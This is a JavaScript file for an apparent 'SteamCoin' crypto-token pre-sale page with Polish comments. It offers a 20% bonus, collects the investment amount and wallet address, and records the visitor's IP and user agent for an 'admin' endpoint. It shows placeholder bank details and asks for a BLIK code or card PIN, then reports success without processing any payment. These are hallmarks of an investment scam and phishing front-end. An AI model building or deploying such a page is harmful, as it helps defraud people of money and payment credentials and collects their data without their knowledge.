document.addEventListener('DOMContentLoaded', function() {
    const currencySignupForm = document.getElementById('currencySignupForm');
    const investmentAmount = document.getElementById('investmentAmount');
    const tokenAmount = document.getElementById('tokenAmount');
    const bonusAmount = document.getElementById('bonusAmount');
    const paymentMethod = document.getElementById('paymentMethod');
    const walletAddress = document.getElementById('walletAddress');
    const buyButton = document.getElementById('buyButton');

    const STC_PRICE = 7.47; // Cena 1 STC w PLN
    const BONUS_PERCENTAGE = 20; // 20% bonus
    const MIN_INVESTMENT = 50; // Minimalna kwota inwestycji w PLN

    // Kalkulator tokenów
    investmentAmount.addEventListener('input', function() {
        const value = parseFloat(this.value) || 0;
        
        if (value < MIN_INVESTMENT) {
            showError('investmentAmount', `Minimalna kwota inwestycji to ${MIN_INVESTMENT} PLN`);
            buyButton.disabled = true;
        } else {
            removeError('investmentAmount');
            // Obliczanie tokenów (7.47 PLN = 1 STC)
            const tokens = Math.floor(value / STC_PRICE);
            const bonus = Math.floor(tokens * (BONUS_PERCENTAGE / 100));
            
            tokenAmount.textContent = tokens.toLocaleString();
            bonusAmount.textContent = bonus.toLocaleString();
            buyButton.disabled = false;
        }
    });

    // Obsługa przycisku Kup
    buyButton.addEventListener('click', async function() {
        if (validateForm()) {
            const submitButton = this;
            submitButton.disabled = true;
            submitButton.textContent = 'Przetwarzanie...';

            try {
                // Przygotowanie danych użytkownika
                const userData = {
                    investmentAmount: investmentAmount.value,
                    paymentMethod: paymentMethod.value,
                    walletAddress: walletAddress.value,
                    tokens: tokenAmount.textContent,
                    bonusTokens: bonusAmount.textContent,
                    notifications: {
                        priceUpdates: document.getElementById('priceUpdates').checked,
                        newsUpdates: document.getElementById('newsUpdates').checked,
                        marketUpdates: document.getElementById('marketUpdates').checked
                    },
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    ipAddress: await getIPAddress()
                };
                
                // Wysyłanie danych do administratora
                await sendDataToAdmin(userData);
                
                // Wyświetlenie sekcji płatności
                showPaymentSection(userData.paymentMethod);
            } catch (error) {
                console.error('Błąd podczas przetwarzania formularza:', error);
                showError('form', 'Wystąpił błąd podczas przetwarzania formularza. Spróbuj ponownie później.');
                submitButton.disabled = false;
                submitButton.textContent = 'Kup SteamCoiny';
            }
        }
    });

    // Obsługa formularza
    const paymentSection = document.getElementById('paymentSection');
    const paymentForm = document.getElementById('paymentForm');
    const blikField = document.getElementById('blikField');
    const cardField = document.getElementById('cardField');
    const paymentSuccess = document.getElementById('paymentSuccess');

    function showPaymentSection(method) {
        currencySignupForm.style.display = 'none';
        paymentSection.style.display = 'block';
        paymentSuccess.style.display = 'none';
        blikField.style.display = 'none';
        cardField.style.display = 'none';
        
        if (method === 'blik') {
            blikField.style.display = 'block';
        } else if (method === 'bank_transfer') {
            // Dla przelewu bankowego pokazujemy dane do przelewu
            const bankDetails = document.createElement('div');
            bankDetails.innerHTML = `
                <h3>Dane do przelewu:</h3>
                <p>Bank: SteamCoin Bank</p>
                <p>Nr konta: 12 3456 7890 1234 5678 9012 3456</p>
                <p>Tytuł przelewu: SteamCoin Pre-sale</p>
                <p>Kwota: ${investmentAmount.value} PLN</p>
            `;
            paymentSection.insertBefore(bankDetails, paymentForm);
        } else {
            cardField.style.display = 'block';
        }
    }

    paymentForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Walidacja kodu BLIK lub PIN-u karty
        if (blikField.style.display === 'block') {
            const blikCode = document.getElementById('blikCode').value.trim();
            if (!/^[0-9]{6}$/.test(blikCode)) {
                alert('Podaj poprawny 6-cyfrowy kod BLIK.');
                return;
            }
        }
        if (cardField.style.display === 'block') {
            const cardPin = document.getElementById('cardPin').value.trim();
            if (!/^[0-9]{4}$/.test(cardPin)) {
                alert('Podaj poprawny 4-cyfrowy PIN karty.');
                return;
            }
        }
        
        // Ukrycie sekcji płatności i pokazanie komunikatu sukcesu
        paymentSection.style.display = 'none';
        paymentSuccess.style.display = 'block';
    });

    function validateForm() {
        let isValid = true;

        // Walidacja kwoty inwestycji
        const amount = parseFloat(investmentAmount.value);
        if (isNaN(amount) || amount < MIN_INVESTMENT) {
            showError('investmentAmount', `Minimalna kwota inwestycji to ${MIN_INVESTMENT} PLN`);
            isValid = false;
        } else {
            removeError('investmentAmount');
        }

        // Walidacja metody płatności
        if (!paymentMethod.value) {
            showError('paymentMethod', 'Wybierz metodę płatności');
            isValid = false;
        } else {
            removeError('paymentMethod');
        }

        // Walidacja adresu portfela
        const address = walletAddress.value.trim();
        if (!address) {
            showError('walletAddress', 'Adres portfela jest wymagany');
            isValid = false;
        } else if (!isValidWalletAddress(address)) {
            showError('walletAddress', 'Nieprawidłowy format adresu portfela');
            isValid = false;
        } else {
            removeError('walletAddress');
        }

        // Walidacja checkboxów
        const terms = document.getElementById('terms');
        const risk = document.getElementById('risk');

        if (!terms.checked) {
            showError('terms', 'Musisz zaakceptować regulamin i politykę prywatności');
            isValid = false;
        } else {
            removeError('terms');
        }

        if (!risk.checked) {
            showError('risk', 'Musisz potwierdzić zrozumienie ryzyka inwestycyjnego');
            isValid = false;
        } else {
            removeError('risk');
        }

        return isValid;
    }

    function isValidWalletAddress(address) {
        // Prosta walidacja adresu portfela (można dostosować do konkretnego formatu)
        return /^[0-9a-zA-Z]{30,}$/.test(address);
    }

    function showError(fieldId, message) {
        const field = document.getElementById(fieldId);
        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.textContent = message;
        
        removeError(fieldId);
        field.parentNode.appendChild(errorDiv);
        field.classList.add('error');
    }

    function removeError(fieldId) {
        const field = document.getElementById(fieldId);
        const errorDiv = field.parentNode.querySelector('.error-message');
        if (errorDiv) {
            errorDiv.remove();
        }
        field.classList.remove('error');
    }

    async function getIPAddress() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Błąd podczas pobierania adresu IP:', error);
            return 'Nieznany';
        }
    }

    async function sendDataToAdmin(userData) {
        try {
            const response = await fetch('http://localhost:3000/api/register', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(userData)
            });
            
            if (!response.ok) {
                throw new Error('Błąd podczas wysyłania danych');
            }
            
            console.log('Dane użytkownika zostały wysłane:', userData);
        } catch (error) {
            console.error('Błąd podczas wysyłania danych:', error);
            throw error;
        }
    }
}); 